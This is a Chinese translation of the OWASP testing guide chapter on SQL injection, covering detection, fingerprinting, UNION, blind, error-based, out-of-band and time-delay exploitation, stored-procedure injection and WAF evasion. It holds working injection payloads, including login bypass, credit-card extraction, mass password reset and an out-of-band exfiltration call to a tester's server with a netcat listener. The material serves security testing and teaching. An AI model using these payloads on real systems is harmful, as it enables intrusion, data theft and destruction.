# 测试 SQL 注入

|ID          |
|------------|
|WSTG-INPV-05|

## 概述

SQL 注入测试检查是否有可能将数据注入应用程序/站点，使其在数据库中执行用户控制的 SQL 查询。如果应用程序使用用户输入来创建 SQL 查询而未进行适当的输入验证，测试人员就能发现 SQL 注入漏洞。成功利用此类漏洞允许未经授权的用户访问或操作数据库中的数据，这（如果你还不知道的话）是相当糟糕的。

[SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection)攻击包括通过数据输入或从客户端（浏览器）传输到 Web 应用程序的数据插入或“注入”部分或完整的 SQL 查询。成功的 SQL 注入攻击可以从数据库读取敏感数据、修改数据库数据（插入/更新/删除）、对数据库执行管理操作（例如关闭 DBMS）、恢复 DBMS 文件系统上给定文件的内容或将文件写入文件系统，并在某些情况下向操作系统发出命令。SQL 注入攻击是注入攻击的一种，其中 SQL 命令被注入数据平面输入，以影响预定义 SQL 命令的执行。

通常，Web 应用程序构造 SQL 语句的方式涉及程序员编写的 SQL 语法与用户提供的数据混合。例如：

`select title, text from news where id=$id`

在上面的示例中，变量 `$id` 包含用户提供的数据，其余部分是程序员提供的 SQL 静态部分；使 SQL 语句动态化。

由于其构造方式，用户可以提供精心设计的输入，试图使原始 SQL 语句执行用户选择的进一步操作。下面的示例说明了用户提供的数据 "10 or 1=1"，改变了 SQL 语句的逻辑，修改了 WHERE 子句，添加了条件 "or 1=1"。

`select title, text from news where id=10 or 1=1`

> **_注意：_** 在 SQL 查询中注入条件 OR 1=1 时要小心。虽然这在您注入的初始上下文中可能无害，但应用程序通常会从单个请求中获取数据用于多个不同的查询。如果您的条件到达 UPDATE 或 DELETE 语句，例如，可能导致意外的数据丢失。

SQL 注入攻击可分为以下三类：

- 带内：使用与注入 SQL 代码相同的通道提取数据。这是最直接的攻击，检索到的数据直接呈现在应用程序网页中。
- 带外：使用不同的通道检索数据（例如，生成包含查询结果的电子邮件并发送给测试人员）。
- 推理或盲注：没有实际的数据传输。然而，测试人员可以通过发送特定请求并观察数据库服务器的响应行为来重建信息。

成功的 SQL 注入攻击要求攻击者构造一个语法正确的 SQL 查询。如果应用程序返回由不正确查询生成的错误消息，则攻击者可能更容易重建原始查询的逻辑，从而理解如何正确执行注入。然而，如果应用程序隐藏了错误细节，则测试人员必须能够对原始查询的逻辑进行逆向工程。

关于利用 SQL 注入漏洞的技术，有五种常见技术。此外，这些技术有时可以组合使用（例如联合运算符和带外）：

- 联合运算符：当 SQL 注入漏洞发生在 SELECT 语句中时可以使用，使得将两个查询合并为单个结果或结果集成为可能。
- 布尔型：使用布尔条件来验证某些条件是真还是假。
- 基于错误：此技术强制数据库生成错误，为攻击者或测试人员提供信息，以便优化其注入。
- 带外：使用不同通道检索数据的技术（例如，建立 HTTP 连接将结果发送到 Web 服务器）。
- 时间延迟：使用数据库命令（例如 sleep）在条件查询中延迟响应。当攻击者无法从应用程序获得任何答案（结果、输出或错误）时，此技术非常有用。

## 测试目标

- 识别 SQL 注入点。
- 评估注入的严重性以及通过注入可达到的访问级别。

## 如何测试

### 检测技术

此测试的第一步是了解应用程序何时与数据库服务器交互以访问某些数据。应用程序需要与数据库通信的典型示例包括：

- 认证表单：当使用 Web 表单进行认证时，用户凭据很可能与包含所有用户名和密码（或更准确地说，密码哈希）的数据库进行核对。
- 搜索引擎：用户提交的字符串可用于 SQL 查询，从数据库中提取所有相关记录。
- 电子商务网站：产品及其特性（价格、描述、可用性等）很可能存储在数据库中。

测试人员必须列出所有其值可用于构造 SQL 查询的输入字段，包括 POST 请求的隐藏字段，然后逐一测试它们，试图干扰查询并生成错误。还要考虑 HTTP 头和 Cookie。

通常的第一个测试是在被测字段或参数中添加单引号 `'` 或分号 `;`。前者在 SQL 中用作字符串终止符，如果未被应用程序过滤，将导致不正确的查询。后者用于结束 SQL 语句，如果未被过滤，也可能生成错误。易受攻击字段的输出可能类似于以下（在此示例中为 Microsoft SQL Server）：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

注释分隔符（`--` 或 `/* */` 等）以及其他 SQL 关键字（如 `AND` 和 `OR`）也可用于尝试修改查询。一种非常简单但有时仍然有效的技术是在期望数字的地方插入字符串，因为可能会生成如下错误：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

监视 Web 服务器的所有响应，并查看 HTML/JavaScript 源代码。有时错误存在于其中，但由于某种原因（例如 JavaScript 错误、HTML 注释等）未呈现给用户。完整的错误消息，如示例中的那些，为测试人员提供了丰富的信息，以发起成功的注入攻击。然而，应用程序通常不会提供这么多细节：可能只发出简单的 '500 Server Error' 或自定义错误页面，这意味着我们需要使用盲注技术。在任何情况下，逐一测试每个字段非常重要：只有一个变量变化，而所有其他变量保持不变，以便精确了解哪些参数易受攻击，哪些不易受攻击。

### 标准 SQL 注入测试方法

#### 经典 SQL 注入

考虑以下 SQL 查询：

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

类似的查询通常由 Web 应用程序用于验证用户身份。如果查询返回一个值，则表示数据库中存在具有该组凭据的用户，然后允许用户登录系统，否则访问被拒绝。输入字段的值通常通过 Web 表单从用户获取。假设我们插入以下用户名和密码值：

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

查询将为：

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **_注意：_** 在 SQL 查询中注入条件 OR 1=1 时要小心。虽然这在您注入的初始上下文中可能无害，但应用程序通常会从单个请求中获取数据用于多个不同的查询。如果您的条件到达 UPDATE 或 DELETE 语句，例如，可能导致意外的数据丢失。

如果我们假设参数的值通过 GET 方法发送到服务器，并且易受攻击站点的域为 `www.example.com`，则我们将执行的请求为：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

经过简短分析，我们注意到查询返回一个值（或一组值），因为条件始终为真（`OR 1=1`）。这样，系统在不知道用户名和密码的情况下验证了用户身份。

> 注意：在某些系统中，用户表的第一行可能是管理员用户。在某些情况下，这可能就是返回的个人资料。

另一个示例查询如下：

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

在这种情况下，存在两个问题，一个由于括号的使用，另一个由于 MD5 哈希函数的使用。首先，我们解决括号的问题。这只需添加一些右括号，直到获得正确的查询。为了解决第二个问题，我们尝试规避第二个条件。我们向查询添加一个最终符号，表示注释开始。这样，该符号之后的所有内容都被视为注释。每个 DBMS 都有自己的注释语法，然而，大多数数据库的常见符号是 `/*`。在 Oracle 中，符号是 `--`。因此，我们将用作用户名和密码的值为：

`$username = 1' or '1' = '1'))/*`

`$password = foo`

这样，我们将得到以下查询：

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

（由于 `$username` 值中包含了注释分隔符，查询的密码部分将被忽略。）

请求 URL 将是：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

这可能会返回一些值。有时，认证代码会验证返回的记录/结果数量是否恰好等于 1。在前面的示例中，这种情况可能难以实现（在数据库中每个用户只有一个值）。为了解决这个问题，只需插入一个 SQL 命令，强制返回结果的数量为一个（返回一条记录）。为达到此目的，我们使用运算符 `LIMIT <num>`，其中 `<num>` 是我们希望返回的结果/记录数量。关于前面的示例，用户名和密码字段的值将修改如下：

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

这样，我们创建一个如下请求：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### SELECT 语句

考虑以下 SQL 查询：

`SELECT * FROM products WHERE id_product=$id_product`

同时考虑执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

当测试人员尝试一个有效值（例如本例中的 10）时，应用程序将返回产品的描述。在此场景中测试应用程序是否存在漏洞的好方法是使用逻辑运算，使用 AND 和 OR 运算符。

考虑请求：

`https://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

在这种情况下，应用程序可能会返回一些消息，告诉我们没有可用内容或返回空白页面。然后测试人员可以发送一个真语句，并检查是否有有效结果：

`https://www.example.com/product.php?id=10 AND 1=1`

#### 堆叠查询

根据 Web 应用程序使用的 API 和 DBMS（例如 PHP + PostgreSQL、ASP + SQL SERVER），可能可以在一次调用中执行多个查询。

考虑以下 SQL 查询：

`SELECT * FROM products WHERE id_product=$id_product`

利用上述场景的一种方式是：

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

这样，可以连续执行多个查询，且独立于第一个查询。

### 指纹识别数据库

尽管 SQL 语言是标准，但每个 DBMS 都有其特殊性，在许多方面有所不同，例如特殊命令、检索数据（如用户名和数据库）、功能、注释行等。

当测试人员转向更高级的 SQL 注入利用时，他们需要知道后端数据库是什么。

#### 应用程序返回的错误

找出所使用的后端数据库的第一种方法是观察应用程序返回的错误。以下是一些错误消息的示例：

MySql：

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

一个完整的带有 version() 的 UNION SELECT 也有助于了解后端数据库。

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle：

`ORA-00933: SQL command not properly ended`

MS SQL Server：

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL：

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

如果没有错误消息或出现自定义错误消息，测试人员可以尝试使用不同的拼接技术将注入插入字符串字段：

- MySql：'test' + 'ing'
- SQL Server：'test' 'ing'
- Oracle：'test'||'ing'
- PostgreSQL：'test'||'ing'

### 利用技术

#### 联合利用技术

UNION 运算符在 SQL 注入中用于将测试人员故意伪造的查询与原始查询连接起来。伪造查询的结果将与原始查询的结果连接，允许测试人员获取其他表的列值。假设在我们的示例中，服务器执行的查询如下：

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

我们将设置以下 `$id` 值：

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

我们将得到以下查询：

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

这将把原始查询的结果与 CreditCardTable 表中的所有信用卡号连接起来。关键字 `ALL` 对于绕过使用关键字 `DISTINCT` 的查询是必需的。此外，我们注意到除了信用卡号之外，我们还选择了另外两个值。这两个值是必需的，因为两个查询必须具有相同数量的参数/列，以避免语法错误。

要使用此技术利用 SQL 注入漏洞，测试人员需要找到的第一个细节是 SELECT 语句中正确的列数。

为此，测试人员可以使用 `ORDER BY` 子句，后跟一个数字，指示所选数据库列的编号：

`https://www.example.com/product.php?id=10 ORDER BY 10--`

如果查询成功执行，测试人员可以在此示例中假设 `SELECT` 语句中有 10 列或更多。如果查询失败，则查询返回的列数必须少于 10 列。如果有错误消息可用，它可能是：

`Unknown column '10' in 'order clause'`

在测试人员找出列数之后，下一步是找出列的类型。假设上面的示例中有 3 列，测试人员可以尝试每种列类型，使用 NULL 值来帮助：

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

如果查询失败，测试人员可能会看到类似以下的消息：

`All cells in a column must have the same datatype`

如果查询成功执行，则第一列可能是整数。然后测试人员可以继续前进：

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

在成功的信息收集之后，根据应用程序的不同，它可能只向测试人员显示第一个结果，因为应用程序只处理结果集的第一行。在这种情况下，可以使用 `LIMIT` 子句，或者测试人员可以设置一个无效值，使仅第二个查询有效（假设数据库中没有 ID 等于 99999 的条目）：

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### 隐藏联合利用技术

当您可以使用[联合技术](#联合利用技术)利用 SQL 注入时最好，因为您可以在一次请求中检索查询结果。
但大多数野外的 SQL 注入都是盲注。然而，您可以将其中一些转换为基于联合的注入。

**识别**
以下任一方法可用于识别这些 SQL 注入：

1. 易受攻击的查询返回数据，但注入是盲注。
2. `ORDER BY` 技术有效，但您无法实现基于联合的注入。

**根本原因**
您无法使用常规 Union 技术的原因是易受攻击查询的复杂性。在 Union 技术中，您在 `UNION` 负载之后注释掉查询的其余部分。这对普通查询没问题，但在更复杂的查询中可能存在问题。如果查询的第一部分依赖于第二部分，注释掉其余部分会破坏原始查询。

**场景 1**
易受攻击的查询是一个子查询，父查询负责返回数据。

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> 易受攻击的查询
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _问题：_ 如果您注入一个 `UNION` 负载，它不会影响返回的数据。因为您正在修改 `WHERE` 部分。实际上，您并没有将 `UNION` 查询附加到原始查询上。
- _解决方案：_ 您需要知道后端执行的查询。然后根据该查询创建您的负载。这意味着在需要时关闭左括号或添加适当的关键字。

**场景 2**
易受攻击的查询包含别名或变量声明。

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> 易受攻击的查询
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _问题：_ 当您在注入负载后注释掉原始查询的其余部分时，您会破坏查询，因为某些别名或变量变为 `undefined`。
- _解决方案：_ 您需要在负载开头放置适当的关键字或别名。这样，原始查询的第一部分保持有效。

**场景 3**
易受攻击查询的结果被用于第二个查询。第二个查询返回数据，而不是第一个。

```text
<?php
// 根据产品名称检索产品 ID
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> 易受攻击的查询 #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// 根据产品 ID 检索产品评论
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> 易受攻击的查询 #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 您可以向第一个查询添加 `UNION` 负载，但它不会影响返回的数据。
- _解决方案：_ 您需要在第二个查询中注入。因此，第二个查询的输入不应被清理。然后，您需要使第一个查询不返回数据。现在附加一个返回要注入到 _第二个查询_ 中的负载的 `UNION` 查询。

  **示例：**
  负载的基础（您在第一个查询中注入的内容）：

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  `PAYLOAD` 是您想要注入到 _第二个查询_ 中的内容：

  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  最终负载（替换 `PAYLOAD` 后）：

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                 注入到第二个查询
                                   的负载
  \________________________________________________________/
                              ||
                              \/
   我们注入到易受攻击参数的实际查询
  ```

  注入后的第一个查询：

  ```text
  SELECT               --\
    id                    |
  FROM                    |----> 第一个查询
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> 注入的负载（注入到第二个负载中的内容）
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  注入后的第二个查询：

  ```text
  SELECT            --\
    comments           |
  FROM                 |----> 第二个查询
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> 注入的负载（控制返回数据的最终 UNION 查询）
  SELECT ... -- -'    --/
  ```

**场景 4**
易受攻击的参数被用于多个独立的查询。

```text
<?php
// 根据产品 ID 检索产品详情
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
// 根据产品 ID 检索产品评论
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 将 `UNION` 查询附加到第一个（或第二个）查询不会破坏它，但可能会破坏另一个。
- _解决方案：_ 这取决于应用程序的代码结构。但第一步是了解原始查询。大多数情况下，这些注入是基于时间的。此外，基于时间的负载被注入到多个查询中，这可能会带来问题。
  例如，如果您使用 `SQLMap`，这种情况会混淆该工具，并且输出会变得混乱。因为延迟将不会符合预期。

**提取原始查询**
如您所见，要实现基于联合的注入，始终需要知道原始查询。
您可以使用默认的 DBMS 表检索原始查询：

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**自动化**
自动化工作流程的步骤：

1. 使用 `SQLMap` 和盲注提取原始查询。
2. 根据原始查询构建基础负载，实现基于联合的注入。
3. 通过以下选项之一自动化利用基于联合的注入：
    - 指定 _自定义注入点标记_（`*`）
    - 使用 `--prefix` 和 `--suffix` 标志。

**示例：**
考虑上面讨论的第三个场景。
我们假设 DBMS 是 `MySQL`，第一个和第二个查询只返回一列。
这可以是您提取数据库版本的负载：

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

因此目标 URL 将如下：

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

自动化：

- _自定义注入点标记_（`*`）：

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- `--prefix` 和 `--suffix` 标志：

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### 布尔利用技术

当测试人员发现[盲 SQL 注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况，即对操作结果一无所知时，布尔利用技术非常有用。例如，当程序员创建了一个不揭示任何查询结构或数据库信息的自定义错误页面时，就会发生这种行为。（页面不返回 SQL 错误，可能只返回 HTTP 500、404 或重定向）。

通过使用推理方法，可以避免这一障碍，从而成功恢复某些所需字段的值。此方法包括对服务器执行一系列布尔查询，观察答案，并最终推断出这些答案的含义。我们一如既往地考虑 `www.example.com` 域，并假设它包含一个名为 `id` 的参数，该参数容易受到 SQL 注入攻击。这意味着在执行以下请求时：

`https://www.example.com/index.php?id=1'`

我们将得到一个带有自定义错误消息的页面，该消息是由于查询中的语法错误引起的。我们假设服务器上执行的查询为：

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

这可以通过前面看到的方法进行利用。我们想要获取的是 username 字段的值。我们将执行的测试将允许我们逐个字符地提取 username 字段的值。这可以通过使用一些标准函数来实现，这些函数几乎存在于每个数据库中。对于我们的示例，我们将使用以下伪函数：

- SUBSTRING (text, start, length)：返回从文本的 "start" 位置开始、长度为 "length" 的子字符串。如果 "start" 大于文本长度，则函数返回空值。

- ASCII (char)：返回输入字符的 ASCII 值。如果 char 为 0，则返回空值。

- LENGTH (text)：返回输入文本中的字符数。

通过这些函数，我们将在第一个字符上执行测试，当我们发现其值后，再转到第二个字符，依此类推，直到我们发现整个值。测试将利用 SUBSTRING 函数一次只选择一个字符（选择单个字符意味着将长度参数设为 1），并利用 ASCII 函数获取 ASCII 值，以便进行数值比较。比较结果将与 ASCII 表中的所有值进行比较，直到找到正确的值。作为示例，我们将对 `Id` 使用以下值：

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

这创建了以下查询（从现在起，我们称之为“推理查询”）：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

前一个示例当且仅当 username 字段的第一个字符等于 ASCII 值 97 时返回结果。如果我们得到假值，则我们将 ASCII 表的索引从 97 增加到 98 并重复请求。相反，如果我们得到真值，则将 ASCII 表索引设置为 0，并分析下一个字符，修改 SUBSTRING 函数的参数。问题在于理解如何区分返回真值的测试与返回假值的测试。为此，我们创建一个始终返回假的查询。这可以通过对 `Id` 使用以下值来实现：

`$Id=1' AND '1' = '2`

这将创建以下查询：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

从服务器获得的响应（即 HTML 代码）将是我们的测试的假值。这足以验证执行推理查询获得的值是否与之前执行的测试获得的值相等。有时，此方法不起作用。如果服务器对两个相同的连续 Web 请求返回两个不同的页面，我们将无法区分真值和假值。在这些特殊情况下，需要使用特定的过滤器来消除两次请求之间变化的代码，并获得一个模板。稍后，对于执行的每个推理请求，我们将使用相同的函数从响应中提取相关模板，并执行两个模板之间的控制以决定测试结果。

在前面的讨论中，我们没有处理确定测试终止条件的问题，即何时应该结束推理过程。一种技术使用 SUBSTRING 函数和 LENGTH 函数的特性。当测试将当前字符与 ASCII 代码 0（即空值）进行比较且测试返回真值时，要么我们完成了推理过程（我们已经扫描了整个字符串），要么我们分析的值包含空字符。

我们将为字段 `Id` 插入以下值：

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

其中 N 是我们到目前为止已分析的字符数（不包括空值）。查询将为：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

查询返回真或假。如果我们得到真，则我们已完成推理，因此我们知道参数的值。如果我们得到假，则意味着参数值中存在空字符，我们必须继续分析下一个参数，直到找到另一个空值。

盲 SQL 注入攻击需要大量查询。测试人员可能需要自动工具来利用该漏洞。

#### 基于错误的利用技术

当测试人员由于某种原因无法使用其他技术（如 UNION）利用 SQL 注入漏洞时，基于错误的利用技术非常有用。基于错误的技术包括强制数据库执行某些操作，其结果将是一个错误。这里的关键是尝试从数据库中提取一些数据并将其显示在错误消息中。这种利用技术可能因 DBMS 而异（请查看特定 DBMS 部分）。

考虑以下 SQL 查询：

`SELECT * FROM products WHERE id_product=$id_product`

同时考虑执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如 Oracle 10g）：

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

在此示例中，测试人员将值 10 与函数 `UTL_INADDR.GET_HOST_NAME` 的结果连接。此 Oracle 函数将尝试返回传递给它的参数的主机名，该参数是另一个查询，即用户名。当数据库查找具有用户数据库名称的主机名时，它将失败并返回如下错误消息：

`ORA-292257: host SCOTT unknown`

然后测试人员可以操纵传递给 GET_HOST_NAME() 函数的参数，结果将显示在错误消息中。

#### 带外利用技术

当测试人员发现[盲 SQL 注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况，即对操作结果一无所知时，此技术非常有用。该技术包括使用 DBMS 函数执行带外连接，并将注入查询的结果作为请求的一部分传递到测试人员的服务器。与基于错误的技术一样，每个 DBMS 都有自己的功能。请查看特定 DBMS 部分。

考虑以下 SQL 查询：

`SELECT * FROM products WHERE id_product=$id_product`

同时考虑执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求将是：

`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

在此示例中，测试人员将值 10 与函数 `UTL_HTTP.request` 的结果连接。此 Oracle 函数将尝试连接到 `testerserver` 并发出 HTTP GET 请求，其中包含查询 `SELECT user FROM DUAL` 的返回值。测试人员可以设置 Web 服务器（例如 Apache）或使用 Netcat 工具：

```bash
/home/tester/nc –nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### 时间延迟利用技术

当测试人员发现[盲 SQL 注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况，即对操作结果一无所知时，时间延迟利用技术非常有用。此技术包括发送注入查询，如果条件为真，测试人员可以监视服务器响应所花费的时间。如果存在延迟，测试人员可以假设条件查询的结果为真。这种利用技术可能因 DBMS 而异（请查看特定 DBMS 部分）。

考虑以下 SQL 查询：

`SELECT * FROM products WHERE id_product=$id_product`

同时考虑执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如 MySql 5.x）：

`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

在此示例中，测试人员正在检查 MySql 版本是否为 5.x，使服务器延迟响应 10 秒。测试人员可以增加延迟时间并监视响应。测试人员也不需要等待响应。有时他可以设置一个很高的值（例如 100），并在几秒后取消请求。

#### 存储过程注入

当在存储过程中使用动态 SQL 时，应用程序必须正确清理用户输入，以消除代码注入的风险。如果未清理，用户可能输入恶意 SQL，该 SQL 将在存储过程中执行。

考虑以下 SQL Server 存储过程：

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

用户输入：

```sql
anyusername or 1=1'
anypassword
```

此过程未清理输入，因此允许返回值显示具有这些参数的现有记录。

> 此示例可能看起来不太可能，因为使用动态 SQL 登录用户，但请考虑一个动态报告查询，用户选择要查看的列。用户可以将恶意代码插入此场景并破坏数据。

考虑以下 SQL Server 存储过程：

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

用户输入：

```sql
1 from users; update users set password = 'password'; select *
```

这将导致报告运行，并且所有用户的密码都被更新。

### SQL 注入签名规避技术

这些技术用于绕过 Web 应用防火墙（WAF）或入侵防御系统（IPS）等防御措施。另请参阅 [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### 空白字符

删除空格或添加不会影响 SQL 语句的空格。例如：

```sql
or 'a'='a'

or 'a'  =    'a'
```

添加不会改变 SQL 语句执行的特殊字符，如换行符或制表符。例如：

```sql
or
'a'=
        'a'
```

#### 空字节

在过滤器阻止的任何字符之前使用空字节（%00）。

例如，如果攻击者可能注入以下 SQL：

`' UNION SELECT password FROM Users WHERE username='admin'--`

添加空字节后为：

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### SQL 注释

添加 SQL 内联注释也有助于使 SQL 语句有效并绕过 SQL 注入过滤器。以此 SQL 注入为例：

`' UNION SELECT password FROM Users WHERE name='admin'--`

添加 SQL 内联注释后为：

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL 编码

使用[在线 URL 编码](https://meyerweb.com/eric/tools/dencoder/)对 SQL 语句进行编码：

`' UNION SELECT password FROM Users WHERE name='admin'--`

SQL 注入语句的 URL 编码为：

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### 字符编码

Char() 函数可用于替换英文字符。例如，char(114,111,111,116) 表示 root

`' UNION SELECT password FROM Users WHERE name='root'--`

应用 Char() 后，SQL 注入语句为：

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### 字符串拼接

拼接可以拆分 SQL 关键字并规避过滤器。拼接语法因数据库引擎而异。以 MS SQL 引擎为例：

`select 1`

可以通过如下拼接更改简单的 SQL 语句：

`EXEC('SEL' + 'ECT 1')`

#### 十六进制编码

十六进制编码技术使用十六进制编码替换原始 SQL 语句字符。例如，`root` 可以表示为 `726F6F74`

`Select user from users where name = 'root'`

使用 HEX 值的 SQL 语句为：

`Select user from users where name = 726F6F74`

或

`Select user from users where name = unhex('726F6F74')`

#### 声明变量

将 SQL 注入语句声明为变量并执行。

例如，以下 SQL 注入语句：

`Union Select password`

将 SQL 语句定义为变量 `SQLivar`：

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### 'or 1 = 1' 的替代表达式

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### SQL 通配符注入

大多数 SQL 方言支持单字符通配符（通常是 "`?`" 或 "`_`"）和多字符通配符（通常是 "`%`" 或 "`*`"），可以在使用 `LIKE` 运算符的查询中使用。即使使用了适当的控制措施（如参数或预处理语句）来防止 SQL 注入攻击，也可能将通配符注入查询中。

例如，如果 Web 应用程序允许用户在结账过程中输入折扣代码，并使用诸如 `SELECT * FROM discount_codes WHERE code LIKE ':code'` 的查询检查数据库中是否存在该代码，则输入 `%`（将插入到 `:code` 参数的位置）将匹配所有折扣代码。

此技术也可用于通过越来越具体的查询（如 `a%`、`b%`、`ba%` 等）确定确切的折扣代码。
